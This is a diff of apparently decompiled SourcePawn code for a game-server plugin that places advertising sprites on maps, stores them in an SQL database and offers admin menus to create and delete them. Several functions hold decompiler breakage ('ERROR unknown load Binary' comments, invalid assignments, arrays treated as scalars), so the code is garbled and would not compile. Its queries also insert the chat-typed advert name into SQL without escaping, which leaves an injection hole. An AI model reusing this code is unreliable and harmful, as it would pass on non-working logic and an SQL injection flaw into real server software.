+	GetCurrentMap(mapname, 32);
+	Format(query, 256, "SELECT * FROM reklama WHERE mapname = '%s'", mapname);
+	SQL_TQuery(g_SQL, SQL_PopulateMap, query, any:0, DBPriority:0);
+	return Action:0;
+}
+
+public Action:RoundEnd(Handle:hEvent, String:sEvName[], bool:bDontBroadcast)
+{
+	new iClient = GetClientOfUserId(GetEventInt(hEvent, "userid"));
+	if (InChatName[iClient])
+	{
+		InChatName[iClient] = 0;
+	}
+	ClearUndo();
+	return Action:0;
+}
+
+public SQL_PopulateMap(Handle:owner, Handle:hndl, String:error[], any:data)
+{
+	if (!hndl)
+	{
+		LogError("SQL Query Error: %s", error);
+		SetFailState("Lost connection to database. Reconnecting on map change.");
+	}
+	new Float:pos[3] = 0.0;
+	decl String:sModel[128];
+	while (SQL_FetchRow(hndl))
+	{
+		pos[0] = SQL_FetchFloat(hndl, 1, 0);
+		pos[1] = SQL_FetchFloat(hndl, 2, 0);
+		pos[2] = SQL_FetchFloat(hndl, 3, 0);
+		SQL_FetchString(hndl, 4, sModel, 128, 0);
+		CreateReklama(pos, sModel, false);
+	}
+	return 0;
+}
+
+InitDB()
+{
+	if (SQL_CheckConfig("reklama"))
+	{
+		decl String:error[256];
+		g_SQL = SQL_Connect("reklama", false, error, 255);
+		if (g_SQL)
+		{
+			CreateTable();
+		}
+		else
+		{
+			SetFailState("Could not connect to database, reason: %s", error);
+		}
+	}
+	else
+	{
+		SetFailState("Could not connect to database, reason: no config entry found for 'reklama' in databases.cfg");
+	}
+	return 0;
+}
+
+CreateTable()
+{
+	if (g_SQL)
+	{
+		decl String:query[256];
+		Format(query, 256, "CREATE TABLE IF NOT EXISTS reklama (mapname VARCHAR(64),first REAL, second REAL, third REAL, models_vmt VARCHAR(128), reklama_name VARCHAR(128))");
+		SQL_TQuery(g_SQL, CallBackCreateTable, query, any:0, DBPriority:0);
+		return 0;
+	}
+	SetFailState("Could not create the table, reason: Unable to connect the database");
+	return 0;
+}
+
+public CallBackCreateTable(Handle:owner, Handle:hndl, String:error[], any:data)
+{
+	if (hndl)
+	{
+		return 0;
+	}
+	SetFailState("Could not create the table, reason: %s", error);
+	return 0;
+}
+
+ClearAllBD(client)
+{
+	decl String:query[256];
+	decl String:mapname[32];
+	GetCurrentMap(mapname, 32);
+	Format(query, 256, "DELETE FROM reklama WHERE mapname = '%s'", mapname);
+	SQL_TQuery(g_SQL, SQL_DoNothing, query, any:0, DBPriority:0);
+	CPrintToChat(client, " {GREEN}[{RED}Реклама{GREEN}] {DEFAULT}Убрана вся реклама, на этой карте.");
+	return 0;
+}
+
+public SQL_DoNothing(Handle:owner, Handle:hndl, String:error[], any:data)
+{
+	new var1;
+	if (hndl && strlen(error) > 0)
+	{
+		LogError("SQL query errors: %s", error);
+		SetFailState("Lost connection to database. Reconnecting on map change.");
+	}
+	return 0;
+}
+
+Save(client)
+{
+	if (IsStackEmpty(undo))
+	{
+		CPrintToChat(client, " {GREEN}[{RED}Реклама{GREEN}] {DEFAULT}Раунд был перезагружен. Попробуй снова.");
+		return 0;
+	}
+	new index;
+	new Float:position[3] = 0.0;
+	decl String:sModel[128];
+	decl String:reklama_name[128];
+	decl String:mapname[32];
+	decl String:query[256];
+	ResetPack(pack, false);
+	ResetPack(pack2, false);
+	ReadPackString(pack, sModel, 128);
+	ReadPackString(pack2, reklama_name, 128);
+	GetCurrentMap(mapname, 32);
+	while (!IsStackEmpty(undo))
+	{
+		PopStackCell(undo, index, 0, false);
+		if (IsValidEdict(index))
+		{
+			GetEntPropVector(index, PropType:0, "m_vecOrigin", position, 0);
+			Format(query, 256, "INSERT INTO reklama (mapname, first, second, third, models_vmt, reklama_name) VALUES (\"%s\", \"%f\", \"%f\", \"%f\", \"%s\", \"%s\");", mapname, position, position[1], position[2], sModel, reklama_name);
+			SQL_TQuery(g_SQL, SQL_DoNothing, query, any:0, DBPriority:0);
+		}
+	}
+	CPrintToChat(client, " {GREEN}[{RED}Реклама{GREEN}] {DEFAULT}Реклама успешно сохранена.");
+	return 0;
+}
+
+Undo(client)
+{
+	if (IsStackEmpty(undo))
+	{
+		CPrintToChat(client, " {GREEN}[{RED}Реклама{GREEN}] {DEFAULT}Раунд был перезагружен. Попробуй снова.");
+		return 0;
+	}
+	new index;
+	while (!IsStackEmpty(undo))
+	{
+		PopStackCell(undo, index, 0, false);
+		if (IsValidEdict(index))
+		{
+			AcceptEntityInput(index, "Kill", -1, -1, 0);
+		}
+	}
+	CPrintToChat(client, " {GREEN}[{RED}Реклама{GREEN}] {DEFAULT}Реклама успешно удалена.");
+	return 0;
+}
+
+ClearUndo()
+{
+	if (undo)
+	{
+		while (!IsStackEmpty(undo))
+		{
+			PopStack(undo);
+		}
+	}
+	else
+	{
+		undo = CreateStack(1);
+	}
+	return 0;
+}
+
+public OnAdminMenuReady(Handle:topme)
+{
+	new var1;
+	if (topme && TopM != topme)
+	{
+		return 0;
+	}
+	TopM = topme;
+	new TopMenuObject:mn = AddToTopMenu(topme, "sm_1mpulse_reklama", TopMenuObjectType:0, TopMenuCallBack, TopMenuObject:0, "", 16384, "");
+	AddToTopMenu(topme, "sm_1mpulse_reklama_create", TopMenuObjectType:1, MenuCallBack1, mn, "", 16384, "");
+	AddToTopMenu(topme, "sm_1mpulse_reklama_reset", TopMenuObjectType:1, MenuCallBack2, mn, "", 16384, "");
+	AddToTopMenu(topme, "sm_1mpulse_reklama_resetmap", TopMenuObjectType:1, MenuCallBack3, mn, "", 16384, "");
+	return 0;
+}
+
+public TopMenuCallBack(Handle:topme, TopMenuAction:action, TopMenuObject:object_id, iClient, String:buffer[], maxlength)
+{
+	switch (action)
+	{
+		case 0:
+		{
+			FormatEx(buffer, maxlength, "Управление Рекламой");
+		}
+		case 1:
+		{
+			FormatEx(buffer, maxlength, "Управление Рекламой");
+		}
+		default:
+		{
+		}
+	}
+	return 0;
+}
+
+public MenuCallBack1(Handle:topme, TopMenuAction:action, TopMenuObject:object_id, iClient, String:buffer[], maxlength)
+{
+	switch (action)
+	{
+		case 0:
+		{
+			FormatEx(buffer, maxlength, "Создать рекламу");
+		}
+		case 2:
+		{
+			DisplayMenu(g_hMenu, iClient, 0);
+		}
+		default:
+		{
+		}
+	}
+	return 0;
+}
+
+public MenuCallBack2(Handle:topme, TopMenuAction:action, TopMenuObject:object_id, iClient, String:buffer[], maxlength)
+{
+	switch (action)
+	{
+		case 0:
+		{
+			FormatEx(buffer, maxlength, "Удалить через список");
+		}
+		case 2:
+		{
+			SelectClearReklama(iClient);
+		}
+		default:
+		{
+		}
+	}
+	return 0;
+}
+
+public MenuCallBack3(Handle:topme, TopMenuAction:action, TopMenuObject:object_id, iClient, String:buffer[], maxlength)
+{
+	switch (action)
+	{
+		case 0:
+		{
+			FormatEx(buffer, maxlength, "Удалить всю рекламу на карте");
+		}
+		case 2:
+		{
+			ClearAllBD(iClient);
+		}
+		default:
+		{
+		}
+	}
+	return 0;
+}
+
+public SelectClearReklama(client)
+{
+	decl String:query[256];
+	decl String:mapname[32];
+	GetCurrentMap(mapname, 32);
+	FormatEx(query, 256, "SELECT * FROM reklama WHERE mapname = '%s'", mapname);
+	SQL_TQuery(g_SQL, ShowSelectClearMenu, query, client, DBPriority:1);
+	return 1;
+}
+
+public ShowSelectClearMenu(Handle:owner, Handle:hndl, String:error[], any:client)
+{
+	if (!hndl)
+	{
+		LogError("SQL Query Error: %s", error);
+		SetFailState("Lost connection to database. Reconnecting on map change.");
+	}
+	new count = SQL_GetRowCount(hndl);
+	if (count)
+	{
+		new Handle:menu = CreateMenu(ShowSelectClearMenu_Handler, MenuAction:28);
+		SetMenuTitle(menu, "Выберите рекламу для удаления:");
+		new Float:pos[3] = 0.0;
+		decl String:display[128];
+		decl String:sBuffer[128];
+		decl String:reklama_name[128];
+		decl String:sModel[128];
+		while (SQL_FetchRow(hndl))
+		{
+			pos[0] = SQL_FetchFloat(hndl, 1, 0);
+			pos[1] = SQL_FetchFloat(hndl, 2, 0);
+			pos[2] = SQL_FetchFloat(hndl, 3, 0);
+			SQL_FetchString(hndl, 4, sModel, 128, 0);
+			SQL_FetchString(hndl, 5, reklama_name, 128, 0);
+			FormatEx(display, 128, "%s", reklama_name);
+			FormatEx(sBuffer, 128, "%f:%f:%f:%s:%s", pos, pos[1], pos[2], sModel, reklama_name);
+			AddMenuItem(menu, sBuffer, display, 0);
+		}
+		SetMenuExitBackButton(menu, true);
+		DisplayMenu(menu, client, 0);
+		return 0;
+	}
+	CPrintToChat(client, " {GREEN}[{RED}Реклама{GREEN}] {DEFAULT}На этой карте еще нет рекламы.");
+	return 0;
+}
+
+public ShowSelectClearMenu_Handler(Handle:menu, MenuAction:action, client, Item)
+{
+	if (action == MenuAction:4)
+	{
+		new var1 = 0;
+		new var2;
+		new var3;
+		decl String:reklama_name[128];
+		decl String:sModel[128];
+		decl String:sBuffer[128];
+		GetMenuItem(menu, Item, var2, 256, 0, "", 0);
+		ExplodeString(var2, ":", var3, 5, 64, false);
+		var1 = StringToFloat(var3 + var3);
+		new var4 = var3 + 4;
+		var1 + 4/* ERROR unknown load Binary */ = StringToFloat(var4 + var4);
+		new var5 = var3 + 8;
+		var1 + 8/* ERROR unknown load Binary */ = StringToFloat(var5 + var5);
+		new var6 = var3 + 12;
+		strcopy(sModel, 128, var6 + var6);
+		new var7 = var3 + 16;
+		strcopy(reklama_name, 128, var7 + var7);
+		FormatEx(sBuffer, 128, "%f:%f:%f:%s:%s", var1, var1 + 4, var1 + 8, sModel, reklama_name);
+		new Handle:menu777 = CreateMenu(MainMenu777, MenuAction:28);
+		SetMenuExitBackButton(menu777, true);
+		SetMenuTitle(menu777, "Информация о выбранной рекламе\n \nИмя:%s\nОсь х:%f\nОсь y:%f\nОсь z:%f\nМодель: %s\n", reklama_name, var1, var1 + 4, var1 + 8, sModel);
+		AddMenuItem(menu777, sBuffer, "Удалить", 0);
+		DisplayMenu(menu777, client, 0);
+	}
+	return 0;
+}
+
+public MainMenu777(Handle:menu, MenuAction:action, client, Item)
+{
+	switch (action)
+	{
+		case 4:
+		{
+			switch (Item)
+			{
+				case 0:
+				{
+					new var1 = 0;
+					new var2;
+					new var3;
+					new var4;
+					decl String:reklama_name[128];
+					decl String:sModel[128];
+					GetMenuItem(menu, Item, var3, 256, 0, "", 0);
+					ExplodeString(var3, ":", var4, 5, 64, false);
+					var1 = StringToFloat(var4 + var4);
+					new var5 = var4 + 4;
+					var1 + 4/* ERROR unknown load Binary */ = StringToFloat(var5 + var5);
+					new var6 = var4 + 8;
+					var1 + 8/* ERROR unknown load Binary */ = StringToFloat(var6 + var6);
+					new var7 = var4 + 12;
+					strcopy(sModel, 128, var7 + var7);
+					new var8 = var4 + 16;
+					strcopy(reklama_name, 128, var8 + var8);
+					Format(var2, 256, "DELETE FROM reklama WHERE first = '%f'", var1);
+					SQL_TQuery(g_SQL, SQL_DoNothing, var2, any:0, DBPriority:0);
+					CPrintToChat(client, " {GREEN}[{RED}Реклама{GREEN}] {DEFAULT}Вы удалили выбранную вами рекламу.");
+				}
+				default:
+				{
+				}
+			}
+		}
+		case 8:
+		{
+			if (Item == -6)
+			{
+				SelectClearReklama(client);
+			}
+		}
+		case 16:
+		{
+			CloseHandle(menu);
+		}
+		default:
+		{
+		}
+	}
+	return 0;
+}
+
+ReklamaMenuEnd(iClient)
+{
+	new var1;
+	if (iClient && !IsClientInGame(iClient))
+	{
+		return 0;
+	}
+	new Handle:menu = CreateMenu(ReklamaMenuHandler, MenuAction:28);
+	SetMenuTitle(menu, "Создать рекламу:");
+	AddMenuItem(menu, "", "Сохранить", 0);
+	AddMenuItem(menu, "", "Отменить", 0);
+	SetMenuExitBackButton(menu, true);
+	DisplayMenu(menu, iClient, 0);
+	return 0;
+}
+
+public ReklamaMenuHandler(Handle:menu, MenuAction:action, iClient, Item)
+{
+	switch (action)
+	{
+		case 4:
+		{
+			switch (Item)
+			{
+				case 0:
+				{
+					InChatName[iClient] = 1;
+					CPrintToChat(iClient, " {GREEN}[{RED}Реклама{GREEN}] {DEFAULT}Введите в чат название для этой рекламы!");
+				}
+				case 1:
+				{
+					Undo(iClient);
+				}
+				default:
+				{
+				}
+			}
+		}
+		case 8:
+		{
+			if (Item == -6)
+			{
+				DisplayMenu(g_hMenu, iClient, 0);
+			}
+		}
+		case 16:
+		{
+			CloseHandle(menu);
+		}
+		default:
+		{
+		}
+	}
+	return 0;
+}
+
+GlobalMenu()
+{
+	new Handle:kv = CreateKeyValues("point_reklama", "", "");
+	if (!FileToKeyValues(kv, "addons/sourcemod/configs/point_reklama.ini"))
+	{
+		PrintToServer("Failed to load addons/sourcemod/configs/point_reklama.ini");
+	}
+	if (g_hMenu)
+	{
+		CloseHandle(g_hMenu);
+	}
+	g_hMenu = CreateMenu(GlobalMenuHandler, MenuAction:28);
+	SetMenuTitle(g_hMenu, "Создать рекламу:");
+	if (KvGotoFirstSubKey(kv, true) == 1)
+	{
+		decl String:ItemName[32];
+		decl String:model_vmt[128];
+		decl String:model_vtf[128];
+		do {
+			if (KvGetSectionName(kv, ItemName, 32) == 1)
+			{
+				KvGetString(kv, "name", ItemName, 32, "");
+				KvGetString(kv, "vmt", model_vmt, 128, "");
+				KvGetString(kv, "vtf", model_vtf, 128, "");
+				AddFileToDownloadsTable(model_vmt);
+				AddFileToDownloadsTable(model_vtf);
+				PrecacheModel(model_vmt, false);
+				AddMenuItem(g_hMenu, model_vmt, ItemName, 0);
+			}
+		} while (KvGotoNextKey(kv, true));
+	}
+	else
+	{
+		LogError("addons/sourcemod/configs/point_reklama.ini error");
+	}
+	CloseHandle(kv);
+	return 0;
+}
+
+public GlobalMenuHandler(Handle:hMenu, MenuAction:action, iClient, Item)
+{
+	if (action == MenuAction:4)
+	{
+		decl String:sModel[128];
+		GetMenuItem(g_hMenu, Item, sModel, 128, 0, "", 0);
+		new Float:position[3] = 0.0;
+		ClearUndo();
+		TraceEye(iClient, position);
+		CreateReklama(position, sModel, true);
+		ReklamaMenuEnd(iClient);
+		pack = CreateDataPack();
+		WritePackString(pack, sModel);
+	}
+	return 0;
+}
+
+CreateReklama(Float:position[3], String:sModel[], bool:pushstack)
+{
+	new sprite = CreateEntityByName("env_sprite", -1);
+	if (sprite != -1)
+	{
+		DispatchKeyValue(sprite, "spawnflags", "1");
+		DispatchKeyValue(sprite, "scale", "0.3");
+		DispatchKeyValue(sprite, "rendermode", "1");
+		DispatchKeyValue(sprite, "rendercolor", "255 255 255");
+		DispatchKeyValue(sprite, "model", sModel);
+		DispatchSpawn(sprite);
+		position[2] = position[2] + 50.0;
+		TeleportEntity(sprite, position, NULL_VECTOR, NULL_VECTOR);
+		if (pushstack)
+		{
+			PushStackCell(undo, sprite);
+		}
+	}
+	return 0;
+}
+
+TraceEye(client, Float:pos[3])
+{
+	decl Float:vAngles[3];
+	decl Float:vOrigin[3];
+	GetClientEyePosition(client, vOrigin);
+	GetClientEyeAngles(client, vAngles);
+	TR_TraceRayFilter(vOrigin, vAngles, 1174421507, RayType:1, TraceEntityFilterPlayer, any:0);
+	if (TR_DidHit(Handle:0))
+	{
+		TR_GetEndPosition(pos, Handle:0);
+	}
+	return 0;
+}
+
+public bool:TraceEntityFilterPlayer(entity, contentsMask)
+{
+	new var1;
+	return entity > GetMaxClients() || !entity;
+}
+
+public OnClientConnected(iClient)
+{
+	InChatName[iClient] = 0;
+	return 0;
+}
+
+public OnClientDisconnect(iClient)
+{
+	InChatName[iClient] = 0;
+	return 0;
+}
+
+public Action:Say(iClient, String:command[], args)
+{
+	new var1;
+	if ((!iClient || !IsClientInGame(iClient)) && !InChatName[iClient])
+	{
+		return Action:0;
+	}
+	decl String:sText[192];
+	GetCmdArgString(sText, 192);
+	if (InChatName[iClient])
+	{
+		StripQuotes(sText);
+		TrimString(sText);
+		if (strlen(sText) <= 3)
+		{
+			CPrintToChat(iClient, " {GREEN}[{RED}Реклама{GREEN}] {DEFAULT}Имя рекламы должно быть более 3 символов!");
+			return Action:3;
+		}
+		pack2 = CreateDataPack();
+		WritePackString(pack2, sText);
+		Save(iClient);
+		InChatName[iClient] = 0;
+		return Action:3;
+	}
+	return Action:0;
+}
+
